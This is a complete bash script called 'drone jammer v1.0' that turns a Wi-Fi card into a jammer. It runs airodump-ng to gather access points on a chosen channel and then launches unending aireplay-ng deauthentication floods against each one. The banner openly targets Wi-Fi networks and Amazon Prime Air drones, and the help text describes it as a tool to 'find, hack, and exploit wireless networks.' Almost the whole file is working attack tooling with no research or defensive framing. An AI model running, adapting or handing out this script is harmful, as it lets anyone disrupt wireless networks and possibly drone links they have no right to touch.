#!/bin/bash

#################################################
## CODE NAME : drone jammer v1.0            #####
## Coded By : netwrkspider (Abhisek Kumar)  #####
## E-mail : netwrkspider@netwrkspider.com   #####
## URL : http://www.netwrkspider.com        #####
##					    #####
#################################################


#Declare color c0de of Text Format Variables:

b='\033[1m'
u='\033[4m'
black='\E[30m'
red='\E[31m'
green='\E[32m'
yellow='\E[33m'
blue='\E[34m'
magenta='\E[35m'
cyan='\E[36m'
white='\E[37m'
endc='\E[0m'
enda='\033[0m'

# Check For User ROOT
ch_Root () {
  sleep 1
  if [[ $(id -u) = 0 ]]; then
    echo -e " User ROOT: ${green}OK${endc}"
  else
    echo -e " User ${b}ROOT${enda}: ${red}FAILED${endc}
            This Script Needs To Run As ROOT"
    echo -e " ${b}Drone-jammer v1.0${enda} Will Now Exit"
    echo
    sleep 1
    exit
  fi
}

# Show Logo
clear
echo -e "${b}${blue}
 #####   #####    ####   #    #  ######
 #    #  #    #  #    #  ##   #  #
 #    #  #    #  #    #  # #  #  #####
 #    #  #####   #    #  #  # #  #
 #    #  #   #   #    #  #   ##  #
 #####   #    #   ####   #    #  ######


      #    ##    #    #  #    #  ######  #####
      #   #  #   ##  ##  ##  ##  #       #    #
      #  #    #  # ## #  # ## #  #####   #    #
      #  ######  #    #  #    #  #       #####
 #    #  #    #  #    #  #    #  #       #   #
  ####   #    #  #    #  #    #  ######  #    #
${enda}
					${red} Jamm wifi network / Deauthentication drone(Prime Air) ;)
           				       c0d3d By netwrkspider${endc}"
echo " Checking For ROOT..."
ch_Root

SCAN=0
VERSION=1.0
while getopts "w:c:shv" OPTION; do
	case "$OPTION" in
		# This argument sets the amount of time to wait collecting airodump data
		w)
			WIFIVAR=$OPTARG
			;;
		c)
			NUMBER=$OPTARG
			;;
		s)
			SCAN=1
			;;
		h)
			echo -e "wifijammer, version $VERSION
Usage: $0 [-s] -w [wifi card] -c [channel]

This is a bash based wifi jammer. It uses your wifi card to continuously send de-authenticate packets to every client on a specified channel...(like wifi network, Amazon Prime Air, Drone) at lest thats what its suppose to do. This program needs the Aircrack-ng suit to function and a wifi card that works with aircrack.

Options:
	Required:
	-w	time to wait in minutes during airodump
	-c	channel to scan	

	Optional:
	-s	scan for wireless networks first
	-h	display help message
	-v	display version

Example: $0 -w wlan0 -c 2

Report bugs to https://code.google.com/p/drone-jammer/ -> issues section
Written by technoabh@gmail.com"
			exit 1
			;;
		v)
			echo "$0, version $VERSION"
			;;
	esac
done

if [[ $# -lt 1 ]]; then
	echo -e "drone-jammer, $VERSION
Usage: $0 [-s] -w [wifi card] -c [channel]
Program to find, hack, and exploit wireless networks.
Options:
	Required:
	-w	time to wait in minutes during airodump
	-c	channel to scan	

	Optional:
	-s	scan for wireless networks first
	-h	display help message
	-v	display version

Example: $0 -w wlan0 -c 2

Report bugs to https://code.google.com/p/drone-jammer/ -> issues section
Written by technoabh@gmail.com"
			exit 1
fi

if [[ $WIFIVAR == "" ]]; then
	echo "You must specify the -w option!"
	exit 1
fi

if [[ $NUMBER == "" ]] && [[ $SCAN -eq 0 ]]; then
	echo "You must specify a channel with the -c option!"
	exit 1
fi

if [[ $SCAN -ne 0 ]] && [[ $NUMBER -ne 0 ]]; then
	echo "You may only specify either -s or -c, not both! Exiting..."
	exit 1
fi

if [ x"`which id 2> /dev/null`" != "x" ]; then
	USERID="`id -u 2> /dev/null`"
fi

if [ x$USERID = "x" -a x$UID != "x" ]; then
	USERID=$UID
fi

if [ x$USERID != "x" -a x$USERID != "x0" ]; then
	#Guess not
	echo Run it as root ; exit ;
fi

# Changes working directory to the same as this file
DIR="$( cd "$( dirname "$0" )" && pwd )"
cd $DIR

#Checks if user specified a WIFI card
if [ x"$WIFIVAR" = x"" ]; then
	echo "No wifi card specified, scanning for available cards (doesnt always work)"
	USWC="no"
else
	echo "Using user specified wifi card ""$WIFIVAR"
	USWC="yes"
fi

if [ x"$USWC" = x"no" ]; then
	# Uses Airmon-ng to scan for available wifi cards.
	airmon-ng|cut -b 1,2,3,4,5,6,7 > clist01
	count=0
	if [ -e "clist" ]; then
		rm clist
	fi

	cat clist01 |while read LINE ; do
		if [ $count -gt 3 ];then 
			echo "$LINE" | cut -b 1-7 | tr -d [:space:] >>clist
			count=$((count+1))
		else
			count=$((count+1))
		fi
	done
	rm clist01
	
	WIFI=`cat clist`
	echo "Using first available Wifi card: `airmon-ng|grep "$WIFI"`"
	echo "If you would like to specify your own card please do so at the command line"
	echo "etc: sudo ./drone_jammer.sh  eth0"
	rm clist
else
	WIFI="$WIFIVAR"
fi

#Check for a wifi card
if [ x"$WIFI" = x"" ]; then
	#Guess no wifi card was detected
	echo "No wifi card detected. Quitting" 
	exit
fi

#Start the wireless interface in monitor mode
if [ x"$airmoncard" != x"1" ]; then
	airmon-ng start $WIFI >tempairmonoutput
	airmoncard="1"
fi

#Looks for wifi card thats been set in Monitor mode
if [ x"$testcommandvar02" = x"" ]; then
	WIFI02=`cat tempairmonoutput | grep "monitor mode enabled on" | cut -b 30-40 | tr -d [:space:] |tr -d ")"`
	if [ x$WIFI02 = x ]; then
		WIFI02=`cat tempairmonoutput | grep "monitor mode enabled" | cut -b 1-5 | tr -d [:space:]`
	fi
	WIFI="$WIFI02"
	rm tempairmonoutput
fi
	
echo "$WIFI"

# Asks user to specify a channel to jam, or to see a 40 second scan of the area
#read -p "Please specify a channel to jam, or type in 'scan' (without quotes) to see airodump's output for 40 seconds:" NUMBER

if [[ $SCAN -eq 1 ]]; then
	# scan was entered, so start airodump-ng in channel hopping mode to scan the area
	airodump-ng $WIFI &
	SCANPID=$!
	sleep 40s
	kill $SCANPID
	sleep 1s
 	#Asks user to specify a channel
	read -p "Please specify a channel to jam:" NUMBER
	CHANNEL="$NUMBER"
fi

# Launches airodump-ng on specified channel to start gathering a client list
rm *.csv

echo "Scanning specified channel"
airodump-ng -c $NUMBER -w airodumpoutput $WIFI &> /dev/tty2 &

# Removes temp files that are no longer needed
rm *.cap 2>/dev/null
rm *.kismet.csv 2>/dev/null
rm *.netxml 2>/dev/null

# Makes a folder that will be needed later
mkdir stationlist 2>/dev/null
rm stationlist/*.txt

# Start a loop so new clients can be added to the jamming list
while [ x1 ]; do
	sleep 5s
	# Takes appart the list of clients and reorganizes it in to something useful
	cat airodumpoutput*.csv|while read LINE01 ; do
		echo "$LINE01" > tempLINE01
		LINE=`echo $LINE01|cut -f 1 -d ,|tr -d [:space:]`
		rm tempLINE01
		# Ignores any blank 
		if [ x"$LINE" != x"" ];then
			if [ x"$LINE" = x"StationMAC" ];then
				start="no"
			fi
			if [ x"$start" = x"yes" ];then
				if [ -e stationlist/"$LINE".txt ];then
					echo "" 2>/dev/null
				else
					# Lauches new window with de-authenticate thingy doing it's thing
					echo "Jamming $LINE"
					aireplay-ng --deauth 0 -a $LINE $WIFI &> /dev/tty2 &
					echo "$LINE" > stationlist/$LINE.txt
				fi
			fi
			if [ x"$LINE" = x"BSSID" ];then
				start="yes"
			fi
		fi
	done
done
